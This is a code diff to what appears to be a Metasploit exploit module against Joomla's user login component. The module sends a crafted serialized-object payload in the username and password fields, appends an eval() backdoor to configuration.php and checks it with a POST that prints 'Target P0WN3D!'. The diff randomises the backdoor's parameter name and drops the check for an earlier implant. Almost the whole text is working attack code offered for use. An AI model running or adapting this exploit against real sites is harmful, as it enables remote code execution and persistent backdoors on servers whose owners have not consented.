@@ -38,8 +38,15 @@ class MetasploitModule < Msf::Exploit::Remote
 
     register_advanced_options(
       [
-        OptBool.new('FORCE', [true, 'Force to run without check', false]),
+        OptBool.new('FORCE', [true, 'Force run even if check reports the service is safe.', false]),
       ])
+  end
+
+  def get_random_string(length=50)
+  	source=("a".."z").to_a + ("A".."Z").to_a + (0..9).to_a 
+	key=""
+	length.times{ key += source[rand(source.size)].to_s }
+	return key
   end
 
   def get_session_token
@@ -205,26 +212,10 @@ class MetasploitModule < Msf::Exploit::Remote
 
 
     pwned = false
-    cmd_param_name = 'w0wt00l337'
-
-    # First of all check if the backdoor has been already planted
-    backdoor_res = send_request_cgi({
-		'method'     => 'POST',
-		'uri'	     => normalize_uri(target_uri.path,'configuration.php'),
-		'vars_post'  => {
-			cmd_param_name  => 'echo \'PWNED\';' 
-		}
-	})
-
-    if backdoor_res.to_s.include? 'PWNED' then
-	    pwned = true
-	    print_warning('The backdoor has been already implanted')
-    end
+    cmd_param_name = get_random_string(50) 
 
     sess_token = get_session_token()
     csrf_token = get_csrf_token(sess_token)
-
-
 
     # In order to avoid problems with disabled functions
     # We are gonna append an eval() function at the end of the configuration.php file
@@ -237,58 +228,55 @@ class MetasploitModule < Msf::Exploit::Remote
     # 		Use the implanted backdoor to receive a nice little reverse shell with a PHP payload
 
     
-    if !pwned then
-	    # Implant the backdoor
-	    vprint_status('Cooking the exploit ..')
-	    username_payload = '\\0\\0\\0' * 9
-	    password_payload = 'AAA";'						# close the prev object
-	    password_payload += get_payload_backdoor(cmd_param_name)		# actual payload 
-	    password_payload += 's:6:"return":s:102:' 				# close cleanly the object
+    # Implant the backdoor
+    vprint_status('Cooking the exploit ..')
+    username_payload = '\\0\\0\\0' * 9
+    password_payload = 'AAA";'						# close the prev object
+    password_payload += get_payload_backdoor(cmd_param_name)		# actual payload 
+    password_payload += 's:6:"return":s:102:' 				# close cleanly the object
 
-	    print_status('Sending exploit ..')
+    print_status('Sending exploit ..')
 
 
-	    res = send_request_cgi({
-			'uri'	   => normalize_uri(target_uri.path,'/index.php/component/users'),
-			'method'   => 'POST',
-			'headers'  => {
-				'Cookie' => sess_token
-			},
-			'vars_post' => {
-				'username' => username_payload,
-				'password' => password_payload,
-				'option'   => 'com_users',
-				'task'	   => 'user.login',
-				csrf_token => '1'
-			}
-	    }) 
+    res = send_request_cgi({
+		'uri'	   => normalize_uri(target_uri.path,'/index.php/component/users'),
+		'method'   => 'POST',
+		'headers'  => {
+			'Cookie' => sess_token
+		},
+		'vars_post' => {
+			'username' => username_payload,
+			'password' => password_payload,
+			'option'   => 'com_users',
+			'task'	   => 'user.login',
+			csrf_token => '1'
+		}
+    }) 
 
-	    print_status('Triggering the exploit ..')    
-	    if res.redirection then
-		res_redirect = send_request_cgi({
-			'method' => 'GET',
-			'uri'	 => res.redirection.to_s,
-			'headers' =>{
-				'Cookie' => sess_token
-			}
-		})
-	    end
-
-	    # Ping the backdoor see if everything is ok :/
-	    res = send_request_cgi({
-			'method'     => 'POST',
-			'uri'	     => normalize_uri(target_uri.path,'configuration.php'),
-			'vars_post'  => {
-				cmd_param_name  => 'echo \'PWNED\';' 
-			}
-		})
-	    if res.to_s.include? 'PWNED' then
-	    	print_status('Target P0WN3D! eval your code at /configuration.php with ' + cmd_param_name + ' in a POST')
-		pwned = true
-	    end
-	
-
+    print_status('Triggering the exploit ..')    
+    if res.redirection then
+	res_redirect = send_request_cgi({
+		'method' => 'GET',
+		'uri'	 => res.redirection.to_s,
+		'headers' =>{
+			'Cookie' => sess_token
+		}
+	})
     end
+
+    # Ping the backdoor see if everything is ok :/
+    res = send_request_cgi({
+		'method'     => 'POST',
+		'uri'	     => normalize_uri(target_uri.path,'configuration.php'),
+		'vars_post'  => {
+			cmd_param_name  => 'echo \'PWNED\';' 
+		}
+	})
+    if res.to_s.include? 'PWNED' then
+	print_status('Target P0WN3D! eval your code at /configuration.php with ' + cmd_param_name + ' in a POST')
+	pwned = true
+    end
+
 
 
     if pwned then
